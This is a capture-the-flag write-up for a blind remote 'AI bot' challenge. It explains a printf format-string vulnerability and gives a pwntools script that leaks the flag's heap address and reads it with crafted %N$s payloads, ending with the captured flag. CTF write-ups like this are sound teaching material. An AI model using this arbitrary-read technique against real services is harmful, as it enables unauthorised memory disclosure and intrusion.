## Description
With everything and everyone going AI today, we also are developing our own AI bot. It is a first draft and it still requires some work, but feel free to test it out.

> Connection:
> 
> nc simple-ai-bot.ctf.zone 4242

## Solution

This is a blind remote challenge (no challenge file given). We can try and spam strings but it only scans your input up until a certain length so no overflow. We do however have a printf vulnerability so we can read values off of the stack. When we enter `flag`, it also gives us the address of the flag, i.e `0x60811ca4d040` meaning it's on the heap and it's a 64bit system.
We can then use the printf vulnerability to read the value at that address to get the flag.

```python
from pwn import *

p = remote('simple-ai-bot.ctf.zone', 4242)
context.update(arch='amd64', os='linux')

def get_flag():
    # # First leak the flag address
    p.sendlineafter('>', 'flag')
    line = p.recvline().strip().decode()
    flag_leak = int(line.split()[-1], 16)
    log.info(f"Flag address: {hex(flag_leak)}")
    return flag_leak

def find_leak_point():
    log.info('Finding leak point')
    for i in range(1, 200):
        payload = b"%" + str(i).encode() + b"$pAAAAAAAABBBBBBBB"
        r = exec_payload(payload)
        if b'0x42424242424242' in r:
            return i

def exec_payload(payload):
    if b'\n' in payload:
        return ""
    p.sendlineafter('>', b"BODO" + payload)
    p.recvuntil(b"BODO")
    data = p.recvline().split()[-1]
    log.info("%s => %s" % (repr(payload), repr(data)))
    return data

# read gadget
def leak(addr):
    addr &= (2**64 - 1)
    # 8 bytes payload | 8 bytes address to read from
    payload = b"%" + str(leak_point).encode() + b"$sXXXXXXXX" + p64(addr)
    r = exec_payload(payload)
    if r == b'':
        return b''
    r = r[:r.index(b'XXXXXXXX')]
    if r == b'(null)':
        return b'\x00'
    else:
        return r + b'\x00'

flag_addr = get_flag()
leak_point = 8
# leak_point = find_leak_point()
log.info(f"Found leak at {leak_point}")
flag = leak(flag_addr)
log.info(f"Flag: {flag}")
```

Flag: `flag{bee82de11dda03908f3f3d41e2795cdf}`

Solved by: benkyou
